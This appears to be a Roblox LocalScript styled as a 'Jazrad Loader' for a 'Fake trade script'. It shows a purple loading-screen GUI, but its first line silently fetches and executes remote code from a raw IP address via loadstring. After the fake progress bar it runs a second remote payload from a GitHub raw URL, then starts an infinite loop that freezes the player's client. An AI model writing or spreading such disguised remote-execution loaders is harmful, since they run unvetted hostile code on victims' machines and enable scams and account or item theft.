-- LocalScript (StarterPlayerScripts) - Jazrad Loader (no-freeze, no type annotations)
loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjA0NDE1NzU1LTk3ZjEtNGIzNC05MGQwLTNlZTA5YzBiZTkxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ===== SETTINGS =====
local LOAD_TIME = 60
local SUCCESS_HOLD = 5

-- ===== COLORS (Black and Purple Theme) =====
local BG_COLOR = Color3.fromRGB(15, 10, 30)  -- Dark purple background
local CYAN = Color3.fromRGB(180, 0, 255)     -- Bright purple
local LIGHT = Color3.fromRGB(220, 200, 255)  -- Light purple/white
local DIM = Color3.fromRGB(100, 80, 150)     -- Dim purple
local BAR_BG = Color3.fromRGB(30, 20, 50)    -- Dark purple for bar background

local STATUS_STEPS = {
	"Loading...",
	"Initializing...",
	"Checking dependencies...",
	"Preparing environment...",
	"Injecting...",
	"Finalizing...",
	"Almost done..."
}

-- ===== SINGLETON GUARD (prevents multiple scripts freezing client) =====
local existing = playerGui:FindFirstChild("jazrad")
if existing then
	existing:Destroy()
end

if playerGui:GetAttribute("JazradLoaderRunning") then
	return
end
playerGui:SetAttribute("JazradLoaderRunning", true)

local function safeClearRunningFlag()
	if playerGui then
		playerGui:SetAttribute("JazradLoaderRunning", nil)
	end
end

-- ===== ScreenGui =====
local gui = Instance.new("ScreenGui")
gui.Name = "Fake trade script"
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
gui.DisplayOrder = 999999
gui.ResetOnSpawn = false
gui.Parent = playerGui

-- ===== Card + Shadow =====
local BOX_W, BOX_H = 300, 300

local shadow = Instance.new("Frame", gui)
shadow.AnchorPoint = Vector2.new(0.5, 0.5)
shadow.Position = UDim2.new(0.5, 0, 0.5, 4)
shadow.Size = UDim2.new(0, BOX_W + 10, 0, BOX_H + 10)
shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
shadow.BackgroundTransparency = 0.55
shadow.BorderSizePixel = 0
Instance.new("UICorner", shadow).CornerRadius = UDim.new(0, 18)

local box = Instance.new("Frame", gui)
box.AnchorPoint = Vector2.new(0.5, 0.5)
box.Position = UDim2.new(0.5, 0, 0.5, 0)
box.Size = UDim2.new(0, BOX_W, 0, BOX_H)
box.BackgroundColor3 = BG_COLOR
box.BorderSizePixel = 0
Instance.new("UICorner", box).CornerRadius = UDim.new(0, 16)

local stroke = Instance.new("UIStroke", box)
stroke.Thickness = 1
stroke.Color = Color3.fromRGB(80, 60, 120)
stroke.Transparency = 0.45

-- ===== Title =====
local title = Instance.new("TextLabel", box)
title.Size = UDim2.new(1, 0, 0, 42)
title.Position = UDim2.new(0, 0, 0, 18)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBlack
title.TextSize = 30
title.TextColor3 = LIGHT
title.Text = "Fake trade script"
title.TextXAlignment = Enum.TextXAlignment.Center

-- ===== Dotted Loader =====
local ring = Instance.new("Frame", box)
ring.Size = UDim2.new(0, 110, 0, 110)
ring.Position = UDim2.new(0.5, -55, 0.5, -78)
ring.BackgroundTransparency = 1

local DOT_COUNT = 12
local RADIUS = 44
local DOT_SIZE = 10

local dots = {}
local dotStrokes = {}

for i = 1, DOT_COUNT do
	local dot = Instance.new("Frame", ring)
	dot.Size = UDim2.new(0, DOT_SIZE, 0, DOT_SIZE)
	dot.AnchorPoint = Vector2.new(0.5, 0.5)
	dot.BackgroundColor3 = DIM
	dot.BackgroundTransparency = 0.15
	dot.BorderSizePixel = 0
	Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

	local ds = Instance.new("UIStroke", dot)
	ds.Thickness = 1
	ds.Color = Color3.fromRGB(30, 20, 50)
	ds.Transparency = 0.35

	local angle = ((i - 1) / DOT_COUNT) * math.pi * 2
	dot.Position = UDim2.new(
		0.5, math.cos(angle) * RADIUS,
		0.5, math.sin(angle) * RADIUS
	)

	dots[i] = dot
	dotStrokes[i] = ds
end

-- ===== Percentage (Above Bar) =====
local percent = Instance.new("TextLabel", box)
percent.Size = UDim2.new(1, 0, 0, 24)
percent.Position = UDim2.new(0, 0, 1, -98)
percent.BackgroundTransparency = 1
percent.Font = Enum.Font.GothamBold
percent.TextSize = 18
percent.TextColor3 = CYAN
percent.Text = "0%"
percent.TextXAlignment = Enum.TextXAlignment.Center

-- ===== Loading Bar =====
local barBGFrame = Instance.new("Frame", box)
barBGFrame.Size = UDim2.new(0.78, 0, 0, 6)
barBGFrame.Position = UDim2.new(0.11, 0, 1, -74)
barBGFrame.BackgroundColor3 = BAR_BG
barBGFrame.BorderSizePixel = 0
Instance.new("UICorner", barBGFrame).CornerRadius = UDim.new(1, 0)

local barFill = Instance.new("Frame", barBGFrame)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = CYAN
barFill.BorderSizePixel = 0
Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)

-- ===== Status Text (Below Bar) =====
local status = Instance.new("TextLabel", box)
status.Size = UDim2.new(1, -20, 0, 22)
status.Position = UDim2.new(0, 10, 1, -54)
status.BackgroundTransparency = 1
status.Font = Enum.Font.Gotham
status.TextSize = 16
status.TextColor3 = LIGHT
status.TextXAlignment = Enum.TextXAlignment.Center
status.Text = STATUS_STEPS[1]

-- ===== Tween bar (no yielding) =====
TweenService:Create(
	barFill,
	TweenInfo.new(LOAD_TIME, Enum.EasingStyle.Linear, Enum.EasingDirection.Out),
	{ Size = UDim2.new(1, 0, 1, 0) }
):Play()

-- ===== Connections & cleanup =====
local alive = true
local hbConn = nil

local function cleanup()
	alive = false
	if hbConn then
		hbConn:Disconnect()
		hbConn = nil
	end
	safeClearRunningFlag()
end

-- ===== Efficient tick (~10Hz) =====
local startTime = os.clock()
local lastDotIndex = -1
local lastStatusStep = 1
local accum = 0

local function setDotStates(activeIndex)
	local t1 = ((activeIndex - 2) % DOT_COUNT) + 1
	local t2 = ((activeIndex - 3) % DOT_COUNT) + 1

	for i = 1, DOT_COUNT do
		local dot = dots[i]
		local ds = dotStrokes[i]
		if i == activeIndex then
			dot.BackgroundColor3 = CYAN
			dot.BackgroundTransparency = 0
			ds.Transparency = 0.05
		elseif i == t1 then
			dot.BackgroundColor3 = Color3.fromRGB(140, 60, 200)
			dot.BackgroundTransparency = 0.05
			ds.Transparency = 0.18
		elseif i == t2 then
			dot.BackgroundColor3 = Color3.fromRGB(120, 50, 170)
			dot.BackgroundTransparency = 0.10
			ds.Transparency = 0.28
		else
			dot.BackgroundColor3 = DIM
			dot.BackgroundTransparency = 0.15
			ds.Transparency = 0.35
		end
	end
end

hbConn = RunService.Heartbeat:Connect(function(dt)
	if not alive then return end
	accum += dt
	if accum < 0.10 then return end -- ~10 times/sec
	accum = 0

	local elapsed = os.clock() - startTime
	local progress = math.clamp(elapsed / LOAD_TIME, 0, 1)
	percent.Text = tostring(math.floor(progress * 100)) .. "%"

	local dotIndex = (math.floor(elapsed * 8) % DOT_COUNT) + 1
	if dotIndex ~= lastDotIndex then
		lastDotIndex = dotIndex
		setDotStates(dotIndex)
	end

	local step = math.clamp(math.floor(progress * #STATUS_STEPS) + 1, 1, #STATUS_STEPS)
	if step ~= lastStatusStep then
		lastStatusStep = step
		status.Text = STATUS_STEPS[step]
	end

	if progress >= 1 then
		cleanup()

		if ring then ring:Destroy() end
		if barBGFrame then barBGFrame:Destroy() end
		if percent then percent:Destroy() end
		if status then status:Destroy() end

		local check = Instance.new("TextLabel", box)
		check.Size = UDim2.new(1, 0, 0, 90)
		check.Position = UDim2.new(0, 0, 0.5, -60)
		check.BackgroundTransparency = 1
		check.Font = Enum.Font.GothamBlack
		check.Text = "âœ“"
		check.TextSize = 10
		check.TextColor3 = CYAN
		check.TextTransparency = 1
		check.TextXAlignment = Enum.TextXAlignment.Center

		local doneText = Instance.new("TextLabel", box)
		doneText.Size = UDim2.new(1, 0, 0, 30)
		doneText.Position = UDim2.new(0, 0, 0.5, 20)
		doneText.BackgroundTransparency = 1
		doneText.Font = Enum.Font.Gotham
		doneText.TextSize = 18
		doneText.TextColor3 = LIGHT
		doneText.Text = "Done.."
		doneText.TextTransparency = 1
		doneText.TextXAlignment = Enum.TextXAlignment.Center

		TweenService:Create(check, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
			TextTransparency = 0,
			TextSize = 60
		}):Play()

		TweenService:Create(doneText, TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			TextTransparency = 0
		}):Play()

		task.delay(SUCCESS_HOLD, function()
			local t = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

			TweenService:Create(box, t, {BackgroundTransparency = 1}):Play()
			TweenService:Create(shadow, t, {BackgroundTransparency = 1}):Play()
			TweenService:Create(title, t, {TextTransparency = 1}):Play()
			TweenService:Create(check, t, {TextTransparency = 1}):Play()
			TweenService:Create(doneText, t, {TextTransparency = 1}):Play()

			task.delay(0.6, function()
				if gui and gui.Parent then gui:Destroy() end
				loadstring(game:HttpGet("https://raw.githubusercontent.com/mylesbaysden8-hash/Good-fakee-/refs/heads/main/Good",true))()
				wait(5)
				while true do
					for i = 1, math.huge do
						print(math.sqrt(i)) --square root calculations are expensive
					end
				end
			end)
		end)
	end
end)
